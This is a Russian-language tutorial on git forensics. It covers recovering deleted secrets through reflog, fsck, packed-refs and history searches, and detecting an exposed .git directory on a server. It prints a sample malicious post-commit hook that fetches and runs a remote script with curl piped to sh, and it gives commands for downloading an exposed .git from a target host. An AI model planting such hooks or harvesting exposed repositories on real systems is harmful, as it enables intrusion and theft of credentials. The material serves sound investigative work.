## Вопрос, с которого всё начинается

Из репозитория утекли секреты, или на сервере торчит `.git`. Git хранит **всю**
историю — даже то, что удалили. Разберём.

## Наш пример: репозиторий

## Шаг 1: история

```
$ git log --oneline --all | head
a1b2c3d add deploy key
9f8e7d6 fix
```

`--all` включает все ветки. Удалённые коммиты могут оставаться в reflog.

## Шаг 2: поиск секретов в истории

Секреты могли удалить позже, но они в истории:

```
$ git log -p --all | grep -iE 'AKIA|password|BEGIN.*PRIVATE KEY' | head
```

Или инструментами (`gitleaks`, `trufflehog`).

## Шаг 3: .git на сервере

Если `.git` доступен по HTTP, можно восстановить исходники:

```
$ curl -s http://target/.git/HEAD
ref: refs/heads/main
$ curl -s http://target/.git/config
```

Иногда доступны `objects` — репозиторий целиком.

## Шаг 4: авторство и время

```
$ git log --format='%an %ae %ad %s' | head
Ivan ivan@corp.local Thu Jan 14 03:20:00 2026 +0000 add deploy key
```

Необычный автор/время — зацепка.

## Шаг 5: что искать

- секреты в истории (ключи, пароли, токены);
- коммиты вне обычного графика;
- форс-пуш/переписанную историю (reflog);
- доступный `.git` на продакшене;
- ссылки на внешние репозитории.

## Шаг 6: reflog и «удалённые» коммиты

Даже после `reset` или переписывания истории коммиты живут в reflog:

```
$ git reflog | head
a1b2c3d HEAD@{0}: commit: remove key
9f8e7d6 HEAD@{1}: commit: add deploy key
```

Коммит «remove key» показывает, что ключ был добавлен ранее — и его можно достать:

```
$ git show 9f8e7d6
+aws_secret_access_key = ...
```

## Шаг 7: недостижимые объекты (dangling)

Git хранит объекты, на которые уже не ссылается ни одна ветка:

```
$ git fsck --lost-found
dangling commit 3f2a1b0
$ git show 3f2a1b0
```

`fsck` находит такие объекты; их содержимое часто и есть утёкший секрет.

## Шаг 8: восстановление доступного .git

Если по HTTP торчит `.git`, репозиторий можно выкачать целиком:

```
$ wget -r -np http://target/.git/
```

Далее — `git checkout` рабочей копии и полный анализ истории. Так из «утекшего .git» восстанавливают исходники и секреты, даже если на сайте их уже нет.

## Шаг 9: авторство и график

```
$ git shortlog -sne | head
$ git log --format='%ad' --date=iso | cut -d' ' -f1 | sort | uniq -c
```

Всплеск коммитов ночью, автор, которого нет в команде, или коммит от бота с чужого адреса — всё это зацепки. В форензике авторство и время коммита помогают связать изменения с инцидентом.

## Шаг 10: что искать

- секреты в истории и в dangling-объектах;
- переписанную историю (reflog);
- доступный `.git` на продакшене;
- необычное авторство/время;
- конфиги деплоя с токенами.

## Шаг 11: packed-refs и «удалённые» ветки

Ветки, которые удалили, могут остаться в `packed-refs`:

```
$ cat .git/packed-refs | grep -i 'feature\|temp'
refs/heads/temp 3f2a1b0...
```

Коммит из такой ветки всё ещё достижим, пока на него есть ссылка. Так находят работу, которую «спрятали», удалив ветку.

## Шаг 12: hooks как закрепление

Git-хуки — скрипты, которые выполняются на события репозитория. Вредоносный хук переживёт `git pull`:

```
$ ls .git/hooks/
post-commit  pre-push
$ cat .git/hooks/post-commit
#!/bin/sh
curl -s http://203.0.113.5/x.sh | sh
```

Хук, который тянет что-то извне при коммите, — классический бэкдор в среде разработчика. В расследовании проверяем `hooks/` на нестандартные файлы.

## Шаг 13: секреты в удалённых файлах

`.env`, ключи и конфиги часто коммитили, а потом удаляли. Они остаются в истории:

```
$ git log --all --diff-filter=D --name-only | grep -iE '\.env|secret|\.pem'
```

`--diff-filter=D` показывает только удаления — быстрый способ найти, что именно убрали из репозитория.

## Шаг 14: практический итог

Порядок разбора git-инцидента:

1. посмотреть `reflog` и `fsck --lost-found`;
2. проверить `packed-refs` на удалённые ветки;
3. найти секреты в истории (`git log -p`, фильтр удалений);
4. проверить `hooks/` и доступность `.git` снаружи;
5. связать авторство и время с инцидентом.

Так восстанавливают и код, и секреты, даже если их «удалили».

## Практика: поиск утёкшего ключа

Задача: из репозитория утёк ключ, но в текущем коде его нет. Ищем в истории.

```
$ git log -p --all | grep -nE 'AKIA|BEGIN .*PRIVATE KEY' | head
+aws_access_key_id = AKIAEXAMPLE
```

Нашли коммит с ключом. Смотрим, когда его убрали:

```
$ git log --oneline --all -- path/to/config
a1b2c3d remove key
9f8e7d6 add deploy key
```

Ключ добавили коммитом `9f8e7d6` и удалили `a1b2c3d`. Но в reflog он всё ещё доступен:

```
$ git show 9f8e7d6:config/deploy.env
AWS_SECRET_ACCESS_KEY=...
```

Теперь проверим, не тянул ли его кто-то ещё. Ищем недостижимые объекты:

```
$ git fsck --lost-found
dangling blob 7c4e...
$ git show 7c4e...
```

Dangling-объект может содержать версию секрета, которой нет ни в одной ветке.

Наконец, проверяем доступность `.git` снаружи (частая ошибка деплоя):

```
$ curl -s -o /dev/null -w '%{http_code}\n' http://target/.git/config
200
```

Код 200 означает, что репозиторий можно выкачать целиком.

## Что важно

- Секреты ищем в истории, а не в текущих файлах.
- reflog и `fsck --lost-found` возвращают «удалённое».
- Доступный `.git` — критичная утечка.
- Время коммитов связывает утечку с инцидентом.

## Большой репозиторий и автоматизация

В маленьком репозитории секреты ищут глазами. В большом — только инструментами.

**Клонирование без сети.** Если у тебя есть доступ к серверу, анализируй локально скопированный `.git`, не трогая прод:

```
$ cp -r /var/www/app/.git /evidence/app.git
$ git --git-dir=/evidence/app.git log --all --oneline | head
```

**Специализированные сканеры.** `gitleaks` и `trufflehog` прогоняют всю историю по шаблонам ключей:

```
$ gitleaks detect --source /evidence/app.git --report gitleaks.json
```

Они знают форматы AWS/GCP/токенов и меньше шумят, чем ручной grep.

**Разбор pack-файлов.** Старые коммиты сжаты в `.git/objects/pack/*.pack`. Их содержимое тоже анализируют, но проще через `git`-команды, чем вручную.

**Ограничения.** Сканер найдёт шаблонные ключи, но пропустит самодельные секреты. Всегда дополняй его ручным просмотром конфигов и `.env`-файлов в истории.

**Связь с инцидентом.** Даже если ключ отозван, факт его наличия в истории — это утечка, которую надо задокументировать с датой и автором.

## Что мы теперь знаем

- Git хранит всю историю, включая удалённое.
- `git log -p --all` ищет секреты.
- Доступный `.git` = утечка исходников.
- Автор/время коммитов — зацепки.
- Reflog хранит «потерянные» коммиты.

- reflog хранит коммиты после reset/переписывания.
- `git fsck --lost-found` находит недостижимые объекты.
- Доступный `.git` позволяет выкачать репозиторий целиком.
- Авторство и график коммитов — зацепки.
- Секреты ищем в истории, а не только в текущем коде.

- `packed-refs` хранит удалённые ветки, пока на коммит есть ссылка.
- Вредоносный git-хук переживает `git pull`.
- `git log --diff-filter=D` находит удалённые файлы с секретами.
- Порядок: reflog → refs → секреты → hooks → авторство.

## Если не сработало

- История переписана? Смотри reflog и бэкапы.
- .git недоступен? Ищи зеркала/форки.
- Нужен масштаб? Используй gitleaks/trufflehog.
